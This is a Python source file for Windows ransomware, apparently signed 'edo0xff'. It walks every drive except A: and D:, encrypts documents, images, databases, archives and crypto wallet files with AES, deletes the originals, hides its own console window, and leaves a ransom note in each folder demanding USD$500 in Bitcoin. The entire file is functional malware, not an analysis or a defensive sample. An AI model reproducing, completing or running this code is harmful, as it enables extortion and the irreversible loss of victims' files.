# está versión está mas completa y depurada 
import os
import sys
import base64

from Crypto.Cipher import AES
from Crypto.Hash import SHA3_256

from win32 import win32api, win32gui, win32process

CONFIG = {
    'Debug': False,
    'ValidExtensions': [
        '.pdf', '.doc', '.docx', '.odt', '.xls', '.xlsx', '.txt',
        '.php', '.py', '.cpp', '.vbs', '.java', '.asp', '.asm',
        '.jpg', '.jpeg', '.bmp', '.png',
        '.sqlitedb', '.sqlite3',
        '.tar', '.zip', '.rar',
        'wallet.dat'
    ],
    'FileExceptions': [
        'HOW_TO_RECOVER.txt', 'NicePicture.jpg.exe'
    ],
    'Suffix': '.FUCKED'
}


def crypto(key, file_path):
    block_size = 65536
    initial_vector = os.urandom(16)
    output_path = file_path + CONFIG['Suffix']
    file_size = str(os.path.getsize(file_path)).zfill(16)
    encryptor = AES.new(key, AES.MODE_CBC, initial_vector)

    with open(file_path, 'rb') as input_file:
        with open(output_path, 'wb') as output_file:
            output_file.write(bytes(file_size, 'utf-8'))
            output_file.write(initial_vector)

            while True:
                block = input_file.read(block_size)

                if len(block) == 0:
                    break
                if len(block) % 16 != 0:
                    block += bytes(' ' * (16 - len(block) % 16), 'utf-8')

                output_file.write(encryptor.encrypt(block))


def get_enc_key():
    key = base64.b64encode(os.environ['COMPUTERNAME'].encode('ascii'))
    key = SHA3_256.new(key).digest()
    return key


def delete_file(path):
    if os.path.exists(path):
        os.remove(path)


def put_how_to_recover(path):
    message = """
    YOU HAVE BEEN FUCKED, IF YOU WANT TO RECOVER YOUR FILES
    SEND USD$500 ON BTC TO THIS WALLET -> wallet/asd123 THEN
    MAIL ME TO -> somemail@torbox.com AND GET YOUR DECRYPTION
    KEY B)

    °° edo0xff °°
    """

    with open(os.path.join(path, 'HOW_TO_RECOVER.txt'), 'w') as output_file:
        output_file.write(message)


def lets_make_some_noise():
    drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
    enc_key = get_enc_key()
    last_fucked_dir = ''

    for drive in drives:
        if not 'A:' in drive and not 'D:' in drive:
            print(" > Listing files from '%s'" % drive)
            for root, subfiles, files in os.walk(drive):
                if not root.startswith('C:\\Windows'):
                    if not 'recycle.bin' in root.lower():

                        if root != last_fucked_dir:
                            put_how_to_recover(root)
                            last_fucked_dir = root

                        for file in files:

                            if not file in CONFIG['FileExceptions']:
                                file_path = os.path.join(root, file)
                                _, extension = os.path.splitext(file)

                                if extension.lower() in CONFIG['ValidExtensions']:
                                    print(" - %s" % file_path)

                                    if not CONFIG['Debug']:
                                        print(" - Encription starts")
                                        crypto(enc_key, file_path)
                                        delete_file(file_path)


def main():
    if not CONFIG['Debug']:
        def callback(hwnd, pid):
            if win32process.GetWindowThreadProcessId(hwnd)[1] == pid:
                win32gui.ShowWindow(hwnd, 0)

        win32gui.EnumWindows(callback, os.getppid())

    lets_make_some_noise()

main()
